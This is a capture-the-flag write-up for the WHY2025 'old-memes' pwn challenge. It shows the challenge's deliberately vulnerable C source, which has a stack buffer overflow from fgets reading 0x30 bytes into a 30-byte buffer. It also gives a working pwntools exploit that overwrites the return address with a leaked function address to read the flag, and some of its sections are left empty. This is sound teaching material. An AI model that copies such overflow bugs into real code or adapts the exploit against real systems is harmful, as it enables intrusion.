# old-memes - WHY2025
## Challenge Info
- Date: 2025
- CTF Name: WHY2025
- Category: pwn
- Difficulty (subjective): easy
- Points:
- Provided Files: old-memes.c
- tools:
## Brief Description
Always want to do a bufferoverflow? Here is your chance! Ideal for first timers, you even get the source code!
## Initial Analysis
### Environment
``` sh
$ gcc -m32 -fno-stack-protector -o old-memes old-memes.c
```
### Code
``` c
/* Old Memes Never Die 
 * compile without protection, because protection is for Tonies!
 * gcc -m32 -fno-stack-protector -o old-memes old-memes.c
 */

#include <stdio.h>
#include <string.h>


int print_flag() {
    FILE *fptr = fopen("/flag", "r");
    if (fptr == NULL){
        return 1;
    }
    
    char flag[39];
    while (fgets(flag, sizeof(flag), fptr) != NULL){
        printf("F* YOU and your flag: %s !!!", flag);
    }
    fclose(fptr);
    return 0;
}

int ask_what() {
    char what[8];
    char check[6] = "what?";

    printf("\n\nWhat is your name?\n> ");
    fgets(what, sizeof(what), stdin);
    what[strcspn(what, "\r\n")] = 0;
    if (strcmp(check, what) != 0)
        return 1;
    return 0;
}

int ask_name() {
    char name[30];
    printf("\n\nWhat is your name?\n> ");
    fgets(name, 0x30, stdin);
    name[strcspn(name, "\r\n")] = 0;
    printf("F* YOU %s!\n", name);
}

int main() {
    setbuf(stdout, 0);
    printf("(do with this information what you want, but the print_flag function can be found here: %p)\n", print_flag);

    if(ask_what())
        return 1;
    ask_name();
    return 0;
}
```
## Vulnerability
### BOF(Buffer Overflow)
``` c
int ask_name() {
    char name[30];
    printf("\n\nWhat is your name?\n> ");
    fgets(name, 0x30, stdin);
    name[strcspn(name, "\r\n")] = 0;
    printf("F* YOU %s!\n", name);
}
```
`name`의 크기는 30인 반면 `fgets`로 읽어오는 크기는 0x30으로 18byte 넘어서 덮어쓸 수 있다.  
## Exploit
### Strategy
### Exploitation Steps
### Stack Frame of main
| Variable Name | Offset from EBP |
| --- | --- |
### payload
``` python
from pwn import *

p = remote('old-memes-never-die.ctf.zone', 4242)

# print_flag
p.recvuntil(b'do with this information what you want, but the print_flag function can be found here: ')
printf_flag = int(p.recvn(10), 16)
log.info(f'printf_flag = {hex(printf_flag)}')

# ask_what
p.sendlineafter(b'> ', b'what?')

# ask_name
payload = b''
payload += b'A' * 0x26 + b'B' * 0x4
payload += p32(printf_flag)
p.sendlineafter(b'> ', payload)
p.recvuntil(b'F* YOU and your flag: ')
flag = p.recvuntil(b' !!!')
log.info(f'flag: P{str(flag)}')

# interactive
p.interactive()
```